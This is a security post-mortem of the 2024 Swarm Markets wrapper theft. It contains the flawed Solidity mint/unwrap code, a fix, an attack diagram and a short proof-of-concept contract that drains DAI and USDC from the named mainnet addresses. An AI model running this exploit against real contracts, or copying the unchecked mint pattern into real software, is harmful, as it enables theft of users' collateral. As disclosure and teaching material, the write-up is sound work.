# SwarmMarkets — Unauthorized mint/unwrap Collateral Token Theft Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | Swarm Markets |
| **Chain** | Ethereum |
| **Loss** | ~$7,729 (DAI + USDC) |
| **Attacker** | [0x38f68f11](https://etherscan.io/address/0x38f68f119243adbca187e1ef64344ed475a8c69c) |
| **XTOKEN** | [0xD08E245F](https://etherscan.io/address/0xD08E245Fdb3f1504aea4056e2C71615DA7001440) |
| **XTOKEN2** | [0x0a3fbF5B](https://etherscan.io/address/0x0a3fbF5B4cF80DB51fCAe21efe63f6a36D45d2B2) |
| **Vulnerable Wrapper** | [0x2b9dc652](https://etherscan.io/address/0x2b9dc65253c035Eb21778cB3898eab5A0AdA0cCe) |
| **Root Cause** | The `mint()` function allows minting xTokens beyond the Wrapper's actual collateral balance, and `unwrap()` executes without collateralization ratio validation, enabling DAI/USDC theft |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/SwarmMarkets_exp.sol) |

---

## 1. Vulnerability Overview

Swarm Markets' xToken Wrapper issues xTokens backed by DAI and USDC as collateral. The `mint()` function allows minting xTokens in excess of the Wrapper's actual collateral balance, and during `unwrap()`, these over-minted xTokens can be used to withdraw real collateral. The attacker minted XTOKEN equal to the Wrapper's DAI balance and XTOKEN2 equal to the USDC balance, then called `unwrap()` on each to drain the full amounts.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: mint() has no collateral balance validation
interface IXTOKEN {
    function mint(address to, uint256 amount) external;
    function burnFrom(address from, uint256 amount) external;
}

interface IXTOKENWrapper {
    function unwrap(address token, uint256 amount, address to) external;
}

// mint(): anyone can mint arbitrary amounts (no collateral lock)
function mint(address to, uint256 amount) external {
    // mints xToken without requiring collateral deposit
    _mint(to, amount);  // ← no collateralization ratio check
}

// unwrap(): burns xToken and returns collateral
function unwrap(address token, uint256 amount, address to) external {
    IXTOKEN(xToken).burnFrom(msg.sender, amount);
    IERC20(token).transfer(to, amount);  // ← returns collateral even if none was deposited at mint time
}

// ✅ Safe code: collateral deposit required before mint
function mint(address to, uint256 amount) external {
    // collateral must be received first before issuing xToken
    IERC20(collateral).transferFrom(msg.sender, address(this), amount);
    _mint(to, amount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Query Wrapper's DAI balance
  │         └─ daiBalance = DAI.balanceOf(wrapper)
  │
  ├─→ [2] XTOKEN.mint(attacker, daiBalance)
  │         └─ Mint XTOKEN equal to DAI balance with no collateral
  │
  ├─→ [3] Wrapper.unwrap(DAI, daiBalance, attacker)
  │         └─ Burn XTOKEN → Withdraw full DAI balance
  │
  ├─→ [4] Query Wrapper's USDC balance
  │         └─ usdcBalance = USDC.balanceOf(wrapper)
  │
  ├─→ [5] XTOKEN2.mint(attacker, usdcBalance)
  │         └─ Mint XTOKEN2 equal to USDC balance with no collateral
  │
  ├─→ [6] Wrapper.unwrap(USDC, usdcBalance, attacker)
  │         └─ Burn XTOKEN2 → Withdraw full USDC balance
  │
  └─→ [7] ~$7,729 DAI + USDC drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IXTOKEN {
    function mint(address to, uint256 amount) external;
    function burnFrom(address from, uint256 amount) external;
}

interface IXTOKENWrapper {
    function unwrap(address token, uint256 amount, address to) external;
}

contract AttackContract {
    IXTOKEN         constant xtoken   = IXTOKEN(0xD08E245Fdb3f1504aea4056e2C71615DA7001440);
    IXTOKEN         constant xtoken2  = IXTOKEN(0x0a3fbF5B4cF80DB51fCAe21efe63f6a36D45d2B2);
    IXTOKENWrapper  constant wrapper  = IXTOKENWrapper(0x2b9dc65253c035Eb21778cB3898eab5A0AdA0cCe);
    IERC20          constant DAI      = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20          constant USDC     = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testExploit() external {
        // [1] Drain DAI: mint without collateral, then unwrap
        uint256 daiBalance = DAI.balanceOf(address(wrapper));
        xtoken.mint(address(this), daiBalance);
        wrapper.unwrap(address(DAI), daiBalance, address(this));

        // [2] Drain USDC: mint without collateral, then unwrap
        uint256 usdcBalance = USDC.balanceOf(address(wrapper));
        xtoken2.mint(address(this), usdcBalance);
        wrapper.unwrap(address(USDC), usdcBalance, address(this));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Unauthorized token minting / Missing collateralization ratio check |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct call to mint + unwrap) |
| **DApp Category** | Wrapper token / Collateral custody contract |
| **Impact** | Full collateral asset drainage |

## 6. Remediation Recommendations

1. **mint access control**: Restrict the `mint()` function so only trusted contracts or the owner can call it
2. **Collateral pre-deposit**: Receive equivalent collateral before minting xTokens
3. **Enforce 1:1 ratio**: Validate that the total xToken supply does not exceed the Wrapper's collateral balance
4. **unwrap balance validation**: Compare against the Wrapper's actual balance during unwrap to prevent over-withdrawal

## 7. Lessons Learned

- A wrapper token's `mint()` function must only issue tokens after receiving equivalent collateral.
- If anyone can call `mint()`, all assets held in the Wrapper are immediately at risk.
- While the attack was small ($7.7K), the structural flaw of missing collateralization ratio validation becomes catastrophic at higher TVL.